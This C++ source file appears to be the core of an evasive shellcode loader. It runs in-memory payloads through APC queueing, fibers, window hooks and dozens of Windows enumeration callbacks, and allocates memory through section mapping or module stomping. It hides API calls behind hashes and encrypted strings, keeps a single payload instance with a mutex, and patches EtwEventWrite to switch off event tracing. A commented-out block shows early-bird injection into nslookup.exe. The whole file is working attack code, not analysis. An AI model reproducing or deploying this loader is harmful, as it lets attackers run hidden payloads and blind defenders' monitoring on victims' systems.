#include "ShellcodeExec.h"
#include "Struct.h"
#include "PIGSyscall.hpp"
#include "Function.hpp"
#include "Tools.h"
#include <DbgHelp.h>
#include <wincrypt.h>
#include <psapi.h>
#include <powrprof.h>
#include <imm.h>
#include <setupapi.h>
#include <avrfsdk.h>

#pragma comment(lib, "Setupapi.lib")
#pragma comment(lib, "Imm32.lib")
#pragma comment(lib, "PowrProf.lib")
#pragma comment (lib,"Dbghelp.lib")
#pragma comment (lib,"Crypt32.lib")

static auto& dynamicInvoker = DynamicInvoker::get_instance();


auto AlertApc(LPVOID shellcode, SIZE_T shellcodeSize) -> void {
	DWORD dwOldProtection = NULL;
	LPVOID lpMem = shellcode;
	SIZE_T size = shellcodeSize;
	NTSTATUS status = DynamicInvoker::Invoke<NTSTATUS>(NtProtectVirtualMemoryStruct.funcAddr, NtProtectVirtualMemoryStruct.funcHash,
		(HANDLE)-1, &lpMem, &size, PAGE_EXECUTE_READWRITE, &dwOldProtection);
	QueueUserAPC((PAPCFUNC)shellcode, GetCurrentThread(), 0);
	SleepEx(INFINITE, 1);
}

auto fiberExec(LPVOID shellcode, SIZE_T shellcodeSize) -> void {
	DWORD dwOldProtection;
	LPVOID lpMem = shellcode;
	SIZE_T size = shellcodeSize;
	NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtProtectVirtualMemoryStruct.funcAddr, NtProtectVirtualMemoryStruct.funcHash,
		(HANDLE)-1, &lpMem, &size, PAGE_EXECUTE_READWRITE, &dwOldProtection);
	ConvertThreadToFiber(NULL);
	LPVOID lpFiber = CreateFiber(shellcodeSize, (LPFIBER_START_ROUTINE)lpMem, NULL);
	SwitchToFiber(lpFiber);
}

auto WindowshookExec(LPVOID shellcode, SIZE_T shellcodeSize) -> void {
	DWORD dwOldProtection;
	LPVOID lpMem = shellcode;
	SIZE_T size = shellcodeSize;
	NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtProtectVirtualMemoryStruct.funcAddr, NtProtectVirtualMemoryStruct.funcHash,
		(HANDLE)-1, &lpMem, &size, PAGE_EXECUTE_READWRITE, &dwOldProtection);
	HHOOK hhk = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)lpMem, NULL, myGetCurrentThreadId());


	MSG msg;

	PostThreadMessage(myGetCurrentThreadId(), WM_USER, 0, 0);
	PeekMessage(&msg, NULL, 0, 0, PM_REMOVE);
	UnhookWindowsHookEx(hhk);
}

auto EnumExec(LPVOID shellcode, SIZE_T shellcodeSize) -> void {
	DWORD dwOldProtection;
	LPVOID lpMem = shellcode;
	SIZE_T size = shellcodeSize;
	NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtProtectVirtualMemoryStruct.funcAddr, NtProtectVirtualMemoryStruct.funcHash,
		(HANDLE)-1, &lpMem, &size, PAGE_EXECUTE_READWRITE, &dwOldProtection);

	switch (enumMethod) {
	case CASE_CertEnumSystemStore: {
		CertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER, NULL, NULL, (PFN_CERT_ENUM_SYSTEM_STORE)lpMem);
		break;
	}case CASE_SymEnumProcesses: {
		SymInitialize((HANDLE)-1, NULL, true);
		SymEnumProcesses((PSYM_ENUMPROCESSES_CALLBACK)lpMem, NULL);
		break;
	}case CASE_CertEnumSystemStoreLocation: {
		CertEnumSystemStoreLocation(NULL, nullptr, (PFN_CERT_ENUM_SYSTEM_STORE_LOCATION)lpMem);
		break;
	}case CASE_CopyFile2: {
		COPYFILE2_EXTENDED_PARAMETERS params;

		params.dwSize = { sizeof(params) };
		params.dwCopyFlags = COPY_FILE_FAIL_IF_EXISTS;
		params.pfCancel = FALSE;
		params.pProgressRoutine = (PCOPYFILE2_PROGRESS_ROUTINE)lpMem;
		params.pvCallbackContext = nullptr;

		DeleteFileW(ENCRYPT_WSTR("C:\\Windows\\Temp\\backup.log"));
		CopyFile2(ENCRYPT_WSTR("C:\\Windows\\win.ini"), ENCRYPT_WSTR("C:\\Windows\\Temp\\backup.log"), &params);
		break;
	}case CASE_CopyFileEx: {
		DeleteFileW(ENCRYPT_WSTR("C:\\Windows\\Temp\\backup.log"));
		CopyFileExW(ENCRYPT_WSTR("C:\\Windows\\win.ini"), ENCRYPT_WSTR("C:\\Windows\\Temp\\backup.log"), (LPPROGRESS_ROUTINE)lpMem, NULL, FALSE, COPY_FILE_FAIL_IF_EXISTS);
		break;
	}case CASE_CreateThreadPoolWait: {
		HANDLE hEvent;
		hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);


		DWORD dwOldProtection;
		LPVOID lpMem = shellcode;
		SIZE_T size = shellcodeSize;
		NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtProtectVirtualMemoryStruct.funcAddr, NtProtectVirtualMemoryStruct.funcHash,
			(HANDLE)-1, &lpMem, &size, PAGE_EXECUTE_READ, &dwOldProtection);

		PTP_WAIT ptp_w = CreateThreadpoolWait((PTP_WAIT_CALLBACK)lpMem, NULL, NULL);


		SetThreadpoolWait(ptp_w, hEvent, 0);

		// need to send events so the Threadpool Wait Callback has a chance to "catch" them and run
		SetEvent(hEvent);
		WaitForThreadpoolWaitCallbacks(ptp_w, FALSE);
		SetEvent(hEvent);
		while (TRUE)
		{
			Sleep(9000);
		}
		break;
	}case CASE_CreateTimerQueueTimer: {
		HANDLE timer;
		HANDLE queue = ::CreateTimerQueue();
		HANDLE gDoneEvent = ::CreateEvent(NULL, TRUE, FALSE, NULL);
		if (CreateTimerQueueTimer(&timer, queue, (WAITORTIMERCALLBACK)lpMem, NULL, 100, 0, 0)) {

			DebugPrintA(ENCRYPT_STR("Fail"));
		}

		if (WaitForSingleObject(gDoneEvent, INFINITE) != WAIT_OBJECT_0)
			DebugPrintA(ENCRYPT_STR("WaitForSingleObject failed (%d)\n"), GetLastError());
		break;
	}case CASE_CryptEnumOIDInfo: {
		CryptEnumOIDInfo(NULL, NULL, NULL, (PFN_CRYPT_ENUM_OID_INFO)lpMem);
		break;
	}case CASE_EnumCalendarInfo: {
		EnumCalendarInfo((CALINFO_ENUMPROC)lpMem, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
		break;
	}case CASE_EnumCalendarInfoEx: {
		EnumCalendarInfoEx((CALINFO_ENUMPROCEX)lpMem, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
		break;
	}case CASE_EnumChildWindows: {
		EnumChildWindows(NULL, (WNDENUMPROC)lpMem, NULL);
		break;
	}case CASE_EnumDesktopW: {
		EnumDesktopsW(GetProcessWindowStation(), (DESKTOPENUMPROCW)lpMem, NULL);
		break;
	}case CASE_EnumDesktopWindows: {
		EnumDesktopWindows(::GetThreadDesktop(::GetCurrentThreadId()), (WNDENUMPROC)lpMem, NULL);
		break;
	}case CASE_EnumDirTreeW: {
		SymInitialize((HANDLE)-1, NULL, TRUE);

		WCHAR dummy[522];
		EnumDirTreeW((HANDLE)-1, ENCRYPT_WSTR("C:\\Windows"), ENCRYPT_WSTR("*.log"), dummy, (PENUMDIRTREE_CALLBACKW)lpMem, NULL);
		break;
	}case CASE_EnumDisplayMonitors: {
		EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)lpMem, NULL);
		break;
	}case CASE_EnumFontFamiliesExW: {
		LOGFONTW lf = { 0 };
		lf.lfCharSet = DEFAULT_CHARSET;


		HDC dc = GetDC(NULL);
		EnumFontFamiliesExW(dc, &lf, (FONTENUMPROCW)lpMem, NULL, NULL);
		break;
	}case CASE_EnumFontFamiliesW: {
		HDC dc = GetDC(NULL);
		EnumFontFamiliesW(dc, NULL, (FONTENUMPROCW)lpMem, NULL);
		break;

	}case CASE_EnumFontsW: {
		HDC dc = GetDC(NULL);
		EnumFontsW(dc, NULL, (FONTENUMPROCW)lpMem, NULL);
		break;

	}case CASE_EnumLanguageGroupLocalesW: {
		EnumLanguageGroupLocalesW((LANGGROUPLOCALE_ENUMPROCW)lpMem, LGRPID_ARABIC, 0, 0);
		break;
	}case CASE_EnumObjects: {
		LOGFONTW lf = { 0 };
		lf.lfCharSet = DEFAULT_CHARSET;


		HDC dc = GetDC(NULL);
		EnumObjects(dc, OBJ_BRUSH, (GOBJENUMPROC)lpMem, NULL);
		break;
	}case CASE_EnumPageFilesW: {
		EnumPageFilesW((PENUM_PAGE_FILE_CALLBACKW)lpMem, NULL);
		break;
	}case CASE_EnumPwrSchemes: {
		EnumPwrSchemes((PWRSCHEMESENUMPROC)lpMem, NULL);
		break;
	}case CASE_EnumResourceTypesExW: {
		EnumResourceTypesExW(GetMoudlebyName(_wcsdup(ENCRYPT_WSTR("Kernel32.dll"))), (ENUMRESTYPEPROCW)lpMem, NULL, RESOURCE_ENUM_VALIDATE, NULL);
		break;
	}case CASE_EnumResourceTypesW: {
		EnumResourceTypesW(GetMoudlebyName(_wcsdup(ENCRYPT_WSTR("Kernel32.dll"))), (ENUMRESTYPEPROCW)lpMem, NULL);
		break;
	}case CASE_EnumSystemLocales: {
		EnumSystemLocalesEx((LOCALE_ENUMPROCEX)lpMem, LOCALE_ALL, NULL, NULL);
		break;
	}case CASE_EnumThreadWindows: {
		EnumThreadWindows(0, (WNDENUMPROC)lpMem, NULL);
		break;
	}case CASE_EnumTimeFormatsEx: {
		EnumTimeFormatsEx((TIMEFMT_ENUMPROCEX)lpMem, LOCALE_NAME_SYSTEM_DEFAULT, TIME_NOSECONDS, NULL);
		break;
	}case CASE_EnumUILanguagesW: {
		EnumUILanguagesW((UILANGUAGE_ENUMPROCW)lpMem, MUI_LANGUAGE_ID, NULL);
		break;
	}case CASE_EnumWindowStationsW: {
		EnumWindowStationsW((WINSTAENUMPROCW)lpMem, NULL);
		break;
	}case CASE_EnumWindows: {
		EnumWindows((WNDENUMPROC)lpMem, NULL);
		break;
	}case CASE_EnumerateLoadedModules: {
		EnumerateLoadedModules((HANDLE)-1, (PENUMLOADED_MODULES_CALLBACK)lpMem, NULL);
		break;
	}case CASE_FlsAlloc: {
		DWORD dIndex = FlsAlloc((PFLS_CALLBACK_FUNCTION)lpMem);
		CONST CHAR* dummy = ENCRYPT_STR("dummy");

		FlsSetValue(dIndex, &dummy);
	}case CASE_ImmEnumInputContext: {
		ImmEnumInputContext(NULL, (IMCENUMPROC)lpMem, NULL);
		break;
	}case CASE_InitOnceExecuteOnce: {
		PVOID lpContext;
		BOOL  bStatus;

		INIT_ONCE g_InitOnce = INIT_ONCE_STATIC_INIT;

		InitOnceExecuteOnce(&g_InitOnce, (PINIT_ONCE_FN)lpMem, NULL, &lpContext);
		break;
	}case CASE_LdrEnumerateLoadedModules: {
		HMODULE hNtdll = GetMoudlebyName(_wcsdup(ENCRYPT_WSTR("ntdll.dll")));

		if (hNtdll) {
			typedef VOID(NTAPI LDR_ENUM_CALLBACK)(_In_ PLDR_DATA_TABLE_ENTRY ModuleInformation, _In_ PVOID Parameter, _Out_ BOOLEAN* Stop);
			typedef LDR_ENUM_CALLBACK* PLDR_ENUM_CALLBACK;
			typedef NTSTATUS(__stdcall* _LdrEnumerateLoadedModules)(
				BOOL                   ReservedFlag,
				LDR_ENUM_CALLBACK     EnumProc,
				PVOID                  context
				);

			_LdrEnumerateLoadedModules LdrEnumerateLoadedModules = (_LdrEnumerateLoadedModules)GetProcAddressbyHASH(hNtdll, LdrEnumerateLoadedModules_Hashed);
			LdrEnumerateLoadedModules(NULL, (PLDR_ENUM_CALLBACK)lpMem, NULL);
		}
		break;
	}case CASE_lpRtlUserFiberStart: {

#define TEB_FIBERDATA_PTR_OFFSET 0x17ee
#define LPFIBER_RIP_OFFSET 0x0a8
		typedef int(WINAPI* tRtlUserFiberStart)();

		HMODULE hNtdll = GetMoudlebyName(_wcsdup(ENCRYPT_WSTR("ntdll.dll")));
		tRtlUserFiberStart lpRtlUserFiberStart = (tRtlUserFiberStart)GetProcAddressbyHASH(hNtdll, RtlUserFiberStart_Hashed);

		_TEB* teb = NtCurrentTeb();
		NT_TIB* tib = (NT_TIB*)teb;
		void* pTebFlags = (void*)((uintptr_t)teb + TEB_FIBERDATA_PTR_OFFSET);
		*(char*)pTebFlags = *(char*)pTebFlags | 0b100; // set the HasFiberData bit


		uintptr_t lpDummyFiberData = (uintptr_t)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x100);
		*(LPVOID*)(lpDummyFiberData + 0x0a8) = lpMem; // store the shelcode address at the offset of the FiberContext RIP in the Fiber Data
		//call    qword ptr [ntdll!_guard_dispatch_icall_fptr (00007ffa`218b4000)] ds:00007ffa`218b4000={ntdll!guard_dispatch_icall_nop (00007ffa`217cfa80)}

		__writegsqword(0x20, lpDummyFiberData); // set the FiberData pointer
		lpRtlUserFiberStart();
		break;
	}case CASE_SetTimer: {
		UINT_PTR dummy = 0;
		MSG msg;

		SetTimer(NULL, dummy, NULL, (TIMERPROC)lpMem);

		GetMessageW(&msg, NULL, 0, 0);
		DispatchMessageW(&msg);
		break;
	}case CASE_SetupCommitFileQueueW: {
		HSPFILEQ hQueue = SetupOpenFileQueue();
		SetupQueueCopyW(hQueue, ENCRYPT_WSTR("c:\\"), ENCRYPT_WSTR("\\windows\\sytem32\\"), ENCRYPT_WSTR("kernel32.dll"), NULL, NULL, ENCRYPT_WSTR("c:\\windows\\temp\\"), ENCRYPT_WSTR("kernel32.dll"), SP_COPY_NOSKIP);
		SetupCommitFileQueueW(::GetTopWindow(NULL), hQueue, (PSP_FILE_CALLBACK_W)lpMem, NULL);
		break;
	}case CASE_SymFindFileInPath: {
		SymInitialize((HANDLE)(-1), NULL, TRUE);

		SYMSRV_INDEX_INFO finfo;
		SymSrvGetFileIndexInfo(ENCRYPT_STR("c:\\windows\\system32\\kernel32.dll"), &finfo, NULL);

		char dummy[MAX_PATH];


		SymFindFileInPath((HANDLE)(-1), ENCRYPT_STR("c:\\windows\\system32"), ENCRYPT_STR("kernel32.dll"), &finfo.timestamp, finfo.size, 0, SSRVOPT_DWORDPTR, dummy, (PFINDFILEINPATHCALLBACK)lpMem, NULL);
		break;
	}case CASE_SysEnumSourceFiles: {
		SymInitialize((HANDLE)(-1), NULL, TRUE);

		SymEnumSourceFiles((HANDLE)(-1), NULL, NULL, (PSYM_ENUMSOURCEFILES_CALLBACK)lpMem, NULL);
		break;
	}
	default:
		break;
	}

}



//void earlyBirdDebugApc(LPVOID shellcode, SIZE_T shellcodeSize) {
//
//	STARTUPINFO si = { sizeof(STARTUPINFO) };
//	PROCESS_INFORMATION pi;
//	LPVOID lpMem;
//	ULONG dwBytesWritten;
//	DWORD dwOldProtection;
//
//	char str1[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0' };
//	pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(LoadLibraryA("ntdll.dll"), str1);
//
//	CreateProcess(NULL, _wcsdup(L"C:\\Windows\\System32\\nslookup.exe"), NULL, NULL, false, DEBUG_PROCESS, NULL, NULL, &si, &pi);
//	lpMem = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
//	NtWriteVirtualMemory(pi.hProcess, lpMem, shellcode, sizeof(shellcode), &dwBytesWritten);
//	VirtualProtectEx(pi.hProcess, lpMem, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection);
//
//	QueueUserAPC((PAPCFUNC)lpMem, pi.hThread, 0);
//
//	DebugActiveProcessStop(pi.dwProcessId);
//
//}

auto ExecuteShellcode(PExecuteShellcodeStruct execStruct) -> BOOLEAN {
	switch (ExecMethod) {
	case AlertAPC: {
		AlertApc(execStruct->lpMem, execStruct->memSize);
		break;
	}
	case Fiber: {
		fiberExec(execStruct->lpMem, execStruct->memSize);
		break;
	}
	case WindowsHook:{
		WindowshookExec(execStruct->lpMem, execStruct->memSize);
		break;
	}case EnumCallback: {
		EnumExec(execStruct->lpMem, execStruct->memSize);
		break;
	}
	default:
		break;
	}
	return TRUE;
}

auto AllocateMem(LPVOID* lpMem, PSIZE_T size) -> NTSTATUS {
	NTSTATUS status = 0xC0000001;

	switch (allocateMethod) {
	case CASE_NtAllocateVirtualMemory: {

		status = dynamicInvoker.Invoke<NTSTATUS>(NtAllocateVirtualMemoryStruct.funcAddr, NtAllocateVirtualMemoryStruct.funcHash,
			(HANDLE)-1, lpMem, 0, size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

		break;
	}case CASE_NtMapOfView: {
		HANDLE hSection = NULL;
		SIZE_T secSize = *size;
		LARGE_INTEGER sectionSize = { secSize };
		pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddressbyHASH(GetMoudlebyName(_wcsdup(ENCRYPT_WSTR("ntdll.dll"))), NtCreateSection_Hashed);

		status = NtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

		if (NT_SUCCESS(status)) {
			SIZE_T viewSize = *size;
			LPVOID mem = NULL;

			pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddressbyHASH(GetMoudlebyName(_wcsdup(ENCRYPT_WSTR("ntdll.dll"))), NtMapViewOfSection_Hashed);
			status = NtMapViewOfSection(hSection, (HANDLE)-1, lpMem, NULL, NULL, 0, &viewSize, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE);

		}
		break;
	}case CASE_ModuleStomping: {
		HMODULE hModule = myLoadLibrary(ENCRYPT_WSTR("AppVIntegration.dll"));

		if (!hModule) return status;
		PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
		PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);

		for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
			if (memcmp(section[i].Name, ENCRYPT_STR(".data"), 5) == 0) {
				DWORD oldProtect;
				*lpMem = (LPVOID)((BYTE*)hModule + section[i].VirtualAddress);
				*size = section[i].Misc.VirtualSize;

				status = dynamicInvoker.Invoke<NTSTATUS>(NtProtectVirtualMemoryStruct.funcAddr,
					NtProtectVirtualMemoryStruct.funcHash,
					(HANDLE)-1, lpMem, size, PAGE_READWRITE, &oldProtect);
				break;
			}
		}
		break;
	}
	default:
		break;
	}
	return status;
}

auto isPayloadRunning() -> BOOLEAN {
	
	HANDLE hMutex = NULL;
	OBJECT_ATTRIBUTES objAttr = {0};
	UNICODE_STRING uMutexName = {0};
	dynamicInvoker.Invoke<NTSTATUS>(RtlInitUnicodeStringStruct.funcAddr, RtlInitUnicodeStringStruct.funcHash,
		&uMutexName, L"\\BaseNamedObjects\\Sync");
	objAttr.ObjectName = &uMutexName;
	objAttr.Attributes = 0x00000040L; // OBJ_CASE_INSENSITIVE
	objAttr.SecurityDescriptor = NULL;
	objAttr.SecurityQualityOfService = NULL;
	objAttr.Length = sizeof(OBJECT_ATTRIBUTES);


	NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtCreateMutantStruct.funcAddr, NtCreateMutantStruct.funcHash,
		&hMutex, 0x1F0001, &objAttr, TRUE);

	if(status < 0) { // not STATUS_SUCCESS
		return TRUE;
	}
	return FALSE;
}

auto disableETW() -> BOOLEAN {
	DWORD oldProtect = 0;
	char * etwWriteStr = _strdup(ENCRYPT_STR("EtwEventWrite"));
	SIZE_T size = 0x1000;

	HMODULE Ntd1l = GetMoudlebyName(_wcsdup(ENCRYPT_WSTR("ntdll.dll")));
	LPVOID EtwEventWrite = GetProcAddressbyHASH(Ntd1l, EtwEventWrite_Hashed);
	
	NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtProtectVirtualMemoryStruct.funcAddr,
		NtProtectVirtualMemoryStruct.funcHash,
		(HANDLE)-1, &EtwEventWrite, &size, PAGE_EXECUTE_READWRITE, &oldProtect);


	if (!NT_SUCCESS(status)) return FALSE;

#ifdef _WIN64
	memcpy(EtwEventWrite, ENCRYPT_STR("\x48\x33\xc0\xc3"), 4);
#else
	memcpy(EtwEventWrite, ENCRYPT_STR("\x33\xc0\xc2\x14\x00"), 5);
#endif

	status = dynamicInvoker.Invoke<NTSTATUS>(NtProtectVirtualMemoryStruct.funcAddr,
		NtProtectVirtualMemoryStruct.funcHash,
		(HANDLE)-1, &EtwEventWrite, &size, oldProtect, &oldProtect);

	status = dynamicInvoker.Invoke<NTSTATUS>(NtFlushInstructionCacheStruct.funcAddr,
		NtFlushInstructionCacheStruct.funcHash,
		(HANDLE)-1, EtwEventWrite, size);
	if (!NT_SUCCESS(status)) return FALSE;


	return TRUE;

}